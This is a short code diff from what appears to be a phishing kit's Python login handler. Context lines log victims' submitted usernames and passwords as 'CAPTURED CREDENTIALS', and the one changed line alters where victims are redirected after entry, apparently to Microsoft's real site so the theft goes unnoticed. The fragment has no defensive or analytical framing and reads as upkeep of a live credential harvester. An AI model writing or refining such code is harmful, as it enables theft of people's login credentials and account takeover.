@@ -40,7 +40,7 @@ def process_login():
 
     logger.info(f"CAPTURED CREDENTIALS - Username: {username}, Password: {password}")
 
-    return redirect('https://login.microsoftonline.com')
+    return redirect('https://microsoft.com')
 
 def get_ip_address(request):
     if request.headers.get('HTTP_CLIENT_IP'):
